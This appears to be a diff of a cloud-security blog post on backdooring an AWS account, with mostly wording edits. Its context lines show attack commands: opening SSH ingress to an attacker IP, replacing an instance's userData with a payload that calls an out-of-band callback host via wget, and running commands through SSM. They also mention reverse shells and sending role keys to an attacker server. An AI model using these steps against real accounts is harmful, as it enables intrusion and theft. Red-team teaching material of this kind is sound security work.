@@ -1,7 +1,7 @@
 ---
 title: Methods to Backdoor an AWS Account
 author:
-date: 2023-08-20 02:20:00 +0500
+date: 2023-08-20 03:00:00 +0500
 comments: false
 categories: [Cloud-Security, AWS]
 tags: [cloud security, aws] # TAG names should always be lowercase
@@ -197,7 +197,7 @@ _Creating new security group_
 
 Note the `GroupId` as we will need it for the `--group-id` argument in next commands. 
 
-Next, we will add inbound rules that would allow connections over port `22` from our attacker machine's IP (we can use `0.0.0.0/0` as well)
+Next, we will add inbound rules that would allow connections over port `22` from attacker machine's IP (we can use `0.0.0.0/0` as well)
 
 ```bash
 aws ec2 authorize-security-group-ingress --group-id sg-xxxxx --region eu-central-1 --protocol tcp --port 22 --cidr 10.10.10.10/32
@@ -219,7 +219,7 @@ _Attaching security group to target ec2 instance_
 {: .prompt-info}
 
 
-With the new inbound rule added, this instance can be accessed from the our IP over Port 22 (remember, you need credentials to access this over SSH).
+With the new inbound rule added, this instance can be accessed from our IP over Port 22 (remember, you need credentials to access this over SSH).
 
 ## Persistence - EC2 UserData Script
 When launching an instance in AWS, we can specify some configurations as well as some scripts to run once the instance is started. This is done using the `user data` script that is executed once the ec2 instance is launched or rebooted.
@@ -280,7 +280,7 @@ wget http://jzm9mtpy9r9om5l5j21yvcxxjopfd51u.oastify.com/pwned.txt
 {: .prompt-tip}
 
 
-Now we will modify the userdata script for our target instance that we just stopped:
+Now we will modify the userdata attribute of our target instance that we just stopped:
 
 ```bash
 aws ec2 modify-instance-attribute --instance-id i-xxxxxx --attribute userData --value file://userdata.b64.txt --region eu-central-1
@@ -340,12 +340,12 @@ aws ssm list-command-invocations --command-id "e76fb1b8-xxxx-xxxx-xxxx-710d0d977
 ![](/assets/img/posts/methods-to-backdoor-an-aws-account/case-06-02-SSM-RunCommand-Output.png)
 _Output of our previous commands_
 
-> Here we have used `id;hostname` commands to just print the user details and host name of our target EC2 instance. In an actual scenario, an adversary would use a command that could download a malicious file to this instance and run it, add a cron job to send a reverse shell to the attacker periodically, or simply send the Attached roles Keys to the attacker-controlled server.
+> Here we have used `id;hostname` commands to just print the user details and host name of our target EC2 instance. In an actual scenario, an adversary would use a command that could download a malicious file to this instance and run it, add a cron job to send a reverse shell to them periodically, or simply send the attached role's Keys to the their server.
 {: .prompt-tip}
 
 
 ## Wrapping Up
-In this blog post, we talked about a few methods that an adversary can use to create backdoors in an AWS account. There are multiple other ways to create backdoors to achieve persistence (Lambda functions can be used as well). It all depends upon the level of access and your **imagination**.
+In this blog post, we talked about a few methods that an adversary can use to create backdoors in an AWS account. There are multiple other ways to create backdoors to achieve persistence (Lambda functions can be used as well). It all depends upon the level of access and our **imagination**.
 
 Well, that's it for now, see you in the next post folks!
 
